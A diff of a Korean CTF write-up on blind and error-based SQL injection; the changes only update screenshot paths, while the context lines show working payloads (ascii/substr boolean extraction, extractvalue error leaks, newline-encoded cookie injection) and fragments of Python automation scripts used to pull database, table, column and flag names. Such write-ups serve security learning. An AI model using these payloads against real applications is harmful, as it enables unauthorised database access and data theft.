@@ -23,7 +23,7 @@ header:
 
 ## SQL Injection (Blind SQLI)
 
-![blindsql](/assets/screenshots/blind-error-based-sqli/sqli_blind_1.png)
+![blindsql](/assets/web-screenshots/blind-error-based-sqli/sqli_blind_1.png)
 
 이 문제는 Blind SQL Injection 취약점이 존재하는 CTF 문제이다.
 
@@ -51,11 +51,11 @@ Blind SQL Injection을 보다 빠르게 수행하기 위해, 이를 자동화하
 normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 ```
 
-![blindsql](/assets/screenshots/blind-error-based-sqli/python_sqli.png)
+![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_sqli.png)
 
 위와 같이 페이로드를 구성하여 **Blind SQL Injection 자동화를 위한 파이썬 스크립트**를 작성하였다.
 
-![데이터베이스 추출](/assets/screenshots/blind-error-based-sqli/sqli_1_database.png)
+![데이터베이스 추출](/assets/web-screenshots/blind-error-based-sqli/sqli_1_database.png)
 
 스크립트를 실행한 결과, 데이터베이스 이름은 **blindSqli**로 확인되었다.
 
@@ -67,11 +67,11 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 
 위와 같이 파라미터에 들어갈 **파이썬용 Blind SQLi 페이로드**를 구성한 후.
 
-![blindsql](/assets/screenshots/blind-error-based-sqli/python_table_sqli1.png)
+![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_table_sqli1.png)
 
 스크립트를 약간 수정한 뒤, 해당 페이로드로 **테이블 이름을 추출**하였다.
 
-![blindsql](/assets/screenshots/blind-error-based-sqli/python_table_sqli1_find.png)
+![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_table_sqli1_find.png)
 
 > 테이블 이름: **flagTable**
 
@@ -81,7 +81,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 ' or ascii(substr((select column_name from information_schema.columns where table_name='flagTable' limit {j},1),{i},1))={ascii} and '1'='1
 ```
 
-![blindsql](/assets/screenshots/blind-error-based-sqli/python_sqli1_column.png)
+![blindsql](/assets/web-screenshots/blind-error-based-sqli/python_sqli1_column.png)
 
 최종 컬럼 추출 결과:
  - **idx**
@@ -93,7 +93,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 ' or ascii(substr((select flag from flagTable limit {j},1),{i},1))={ascii} and '1'='1
 ```
 
-![blindsql](/assets/screenshots/blind-error-based-sqli/sqli_flag.png)
+![blindsql](/assets/web-screenshots/blind-error-based-sqli/sqli_flag.png)
 
 **이렇게 최종적으로 flag까지 얻어내는 데 성공하였다.**
 
@@ -118,7 +118,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 
 위의 페이로드를 삽입하여 공격한 결과,
 
-![에러 데이터베이스](/assets/screenshots/blind-error-based-sqli/sqli2_database.png)
+![에러 데이터베이스](/assets/web-screenshots/blind-error-based-sqli/sqli2_database.png)
 
 **데이터베이스 이름이 에러 메시지를 통해 노출되었다.**
 
@@ -143,7 +143,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 ' or extractvalue(1,concat(0x7e,(select flag from flagTable limit 0,1)))+and+'1'='1
 ```
 
-![error flag](/assets/screenshots/blind-error-based-sqli/sqli2_flag.png)
+![error flag](/assets/web-screenshots/blind-error-based-sqli/sqli2_flag.png)
 
 **최종적으로 flag까지 얻어내는 데 성공하였다.**
 
@@ -151,14 +151,14 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 
 ## SQL Injection 3 (Error Based SQLI)
 
-![sqli3 home](/assets/screenshots/blind-error-based-sqli/sqli3_home.png)
+![sqli3 home](/assets/web-screenshots/blind-error-based-sqli/sqli3_home.png)
 
 이번 문제는 로그인 화면에서 시작된다.
 우선, 문제에서 제공된 계정 정보를 이용해 로그인을 시도해보았다.
 
 - 계정: normaltic / 1234
 
-![sqli3 login](/assets/screenshots/blind-error-based-sqli/sqli3_login.png)
+![sqli3 login](/assets/web-screenshots/blind-error-based-sqli/sqli3_login.png)
 
 로그인에 성공하면 서버는 `302 Found` 응답과 함께 `index.php`로 리다이렉션시킨다.
 이를 통해 로그인 로직이 정상 동작함을 확인했으며, 이제 이를 바탕으로 SQL Injection 테스트를 진행해볼 것이다.
@@ -180,7 +180,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 
 **실행 결과:**
 
-![sqli3 database](/assets/screenshots/blind-error-based-sqli/sqli3_database.png)
+![sqli3 database](/assets/web-screenshots/blind-error-based-sqli/sqli3_database.png)
 
 **Error Based SQL Injection을 통해 데이터베이스 이름(`sqli_2`)을 성공적으로 추출**할 수 있었다.
 
@@ -206,7 +206,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 ' or extractvalue(1,concat(0x7e,(select flag from flag_table limit 0,1))) and '1'='1
 ```
 
-![sqli3 flag](/assets/screenshots/blind-error-based-sqli/sqli3_flag.png)
+![sqli3 flag](/assets/web-screenshots/blind-error-based-sqli/sqli3_flag.png)
 
 **이렇게 해서 최종적으로 flag 값을 성공적으로 획득하였다.**
 
@@ -235,7 +235,7 @@ normalti' or ascii(substr(database(),{i},1))={ascii} and '1'='1
 
 **실행 결과:**
 
-![sqli4 database](/assets/screenshots/blind-error-based-sqli/sqli4_database.png)
+![sqli4 database](/assets/web-screenshots/blind-error-based-sqli/sqli4_database.png)
 
 > 데이터베이스 이름: **sqli_2_1**
 
@@ -291,7 +291,7 @@ normaltic' and '1'='2
 
 **실행 결과:**
 
-![sqli4 database](/assets/screenshots/blind-error-based-sqli/sqli4_database.png)
+![sqli4 database](/assets/web-screenshots/blind-error-based-sqli/sqli4_database.png)
 
 > 데이터 베이스 이름: **sqli_2_2**
 
@@ -317,7 +317,7 @@ normaltic' and '1'='2
 ' or extractvalue(1,concat(0x7e,(select flag from flagTable_this limit 13,1))) and '1'='1
 ```
 
-![sqli5 flag](/assets/screenshots/blind-error-based-sqli/sqli5_flag.png)
+![sqli5 flag](/assets/web-screenshots/blind-error-based-sqli/sqli5_flag.png)
 
 **이렇게 최종 flag를 획득하였다.**
 
@@ -382,7 +382,7 @@ print(f"Flag → {flag}")
 
 이를 활용하여 데이터베이스 이름부터 테이블, 컬럼, 최종 데이터까지 **순차적으로 자동 추출하는 Python 스크립트**를 작성하였다.
 
-![sqli6 flag](/assets/screenshots/blind-error-based-sqli/sqli6_flag.png)
+![sqli6 flag](/assets/web-screenshots/blind-error-based-sqli/sqli6_flag.png)
 
 **이렇게 flag까지 성공적으로 추출할 수 있었다.**
 
@@ -391,11 +391,11 @@ print(f"Flag → {flag}")
 
 ## 테마 고르기 (Error Based SQLI)
 
-![theme board](/assets/screenshots/blind-error-based-sqli/theme_board.png)
+![theme board](/assets/web-screenshots/blind-error-based-sqli/theme_board.png)
 
 이번 문제는 사용자가 직접 테마를 선택하여 **UI 색상 조합을 적용해보는 테마 커스터마이저 기능**으로 구성되어 있었고, 페이지에서는 Dark, Light, Neon, Minimal, Cyber와 같은 프리셋 버튼을 제공하며 선택된 테마는 실시간으로 "Theme Preview" 영역에 적용되고, 아래에는 **JSON 형식의 현재 설정 값**이 표시되도록 구성되어 있다.
 
-![theme cookie](/assets/screenshots/blind-error-based-sqli/theme_cookie.png)
+![theme cookie](/assets/web-screenshots/blind-error-based-sqli/theme_cookie.png)
 
 Burp Suite로 `/spec4/theme.php` 요청을 확인한 결과,
 클라이언트가 보낸 `Cookie` 헤더 내의 `user_theme=neon` 값이 서버에서 그대로 파싱되어,
@@ -420,7 +420,7 @@ neon'%0aand%0a'1'='1
 neon'%0aor%0aextractvalue(1,concat(0x7e,database()))%0aand%0a'1'='1
 ```
 
-![에러 기반 sql](/assets/screenshots/blind-error-based-sqli/spec4_database.png)
+![에러 기반 sql](/assets/web-screenshots/blind-error-based-sqli/spec4_database.png)
 
 > 데이터베이스 이름 **spec4**
 
@@ -449,7 +449,7 @@ neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0acolumn_name%0afrom%0ainformati
 neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0aflag%0afrom%0aflags%0alimit%0a0,1)))%0aand%0a'1'='1
 ```
 
-![spec4 flag](/assets/screenshots/blind-error-based-sqli/spec4_flag.png)
+![spec4 flag](/assets/web-screenshots/blind-error-based-sqli/spec4_flag.png)
 
 플래그를 추출하는 과정에서 응답 길이 제한으로 인해 일부 값이 잘려 출력되는 문제가 발생하였다. 이를 해결하기 위해, 아래와 같은 쿼리를 사용하여 flag 값의 뒷부분을 `substring()` 함수를 통해 분할 추출하였다.
 
@@ -464,7 +464,7 @@ neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0asubstring(flag,31,32)%0afrom%0
 ## 보안 커뮤니티 (Blind SQLI)
 
 
-![보안 커뮤니티 board](/assets/screenshots/blind-error-based-sqli/spec5.png)
+![보안 커뮤니티 board](/assets/web-screenshots/blind-error-based-sqli/spec5.png)
 
 해당 페이지는 보안 관련 커뮤니티 게시판으로 보이며, 상단에는 게시글을 검색할 수 있는 **Search 입력창**이 존재한다.
 
@@ -472,7 +472,7 @@ neon'%0aor%0aextractvalue(1,concat(0x7e,(SELECT%0asubstring(flag,31,32)%0afrom%0
 
 우선 Burp Suite를 활용하여 **검색 요청 시 전달되는 파라미터를 분석**해보았다.
 
-![보안 커뮤니티 parameter](/assets/screenshots/blind-error-based-sqli/spec5_parameter.png)
+![보안 커뮤니티 parameter](/assets/web-screenshots/blind-error-based-sqli/spec5_parameter.png)
 
 검색 파라미터로 `q=sql`, `q=ql` 등을 넣었을 때 동일한 결과가 출력되는 것으로 보아,
 내부적으로 **SQL의 `LIKE` 문을 사용한 검색 로직**이 적용되어 있는 것으로 추정된다.
@@ -499,7 +499,7 @@ ql%' Or '1%'='1
 응답의 **`Content-Length`가 16일 경우를 거짓 조건의 기준으로 판단**하고,
 이를 활용한 `Boolean-Based Blind SQL Injection`을 통해 자동화를 작성하여 한 글자씩 추출해 볼 것이다.
 
-![파이썬 활용 데이터베이스 추출](/assets/screenshots/blind-error-based-sqli/python_database.png)
+![파이썬 활용 데이터베이스 추출](/assets/web-screenshots/blind-error-based-sqli/python_database.png)
 
 이 파이썬 코드로 추출을 진행 하였다.
 
@@ -534,7 +534,7 @@ for idx, name in enumerate(result_data, 1):
     print(f"{idx}. {name}")
 ```
 
-![파이썬 활용 데이터베이스 추출 완료](/assets/screenshots/blind-error-based-sqli/python_database_success.png)
+![파이썬 활용 데이터베이스 추출 완료](/assets/web-screenshots/blind-error-based-sqli/python_database_success.png)
 
 > 데이터베이스 이름 **spec5**
 
@@ -544,11 +544,11 @@ for idx, name in enumerate(result_data, 1):
 33333%' Or if(ascii(substr((select table_name from infOrmation_schema.tables where table_schema='spec5' limit {j},1),{i},1))={ascii},1,0) and '1%'='1"
 ```
 
-![파이썬 활용 테이블 추출](/assets/screenshots/blind-error-based-sqli/python_table.png)
+![파이썬 활용 테이블 추출](/assets/web-screenshots/blind-error-based-sqli/python_table.png)
 
 위와 같은 방식으로 파이썬 코드를 약간 수정하여, 테이블 목록을 추출하는 스크립트를 작성하였다.
 
-![파이썬 활용 테이블 추출 완료](/assets/screenshots/blind-error-based-sqli/python_table_success.png)
+![파이썬 활용 테이블 추출 완료](/assets/web-screenshots/blind-error-based-sqli/python_table_success.png)
 
 확인된 테이블 이름:
   - comments
@@ -561,7 +561,7 @@ for idx, name in enumerate(result_data, 1):
 33333%' Or if(ascii(substr((select column_name from infOrmation_schema.columns where table_schema='spec5' and table_name='flags' limit {j},1),{i},1))={ascii},1,0) and '1%'='1
 ```
 
-![파이썬 활용 컬럼 추출 완료](/assets/screenshots/blind-error-based-sqli/python_column_success.png)
+![파이썬 활용 컬럼 추출 완료](/assets/web-screenshots/blind-error-based-sqli/python_column_success.png)
 
 확인된 테이블 이름:
  - comments
@@ -575,7 +575,7 @@ for idx, name in enumerate(result_data, 1):
 33333%' Or if(ascii(substr((select flag from flags limit {j},1),{i},1))={ascii},1,0) and '1%'='1
 ```
 
-![파이썬 활용 플래그 추출 완료](/assets/screenshots/blind-error-based-sqli/spec5_flag.png)
+![파이썬 활용 플래그 추출 완료](/assets/web-screenshots/blind-error-based-sqli/spec5_flag.png)
 
 **이렇게 마지막 문제까지 모두 마무리 했다.**
 
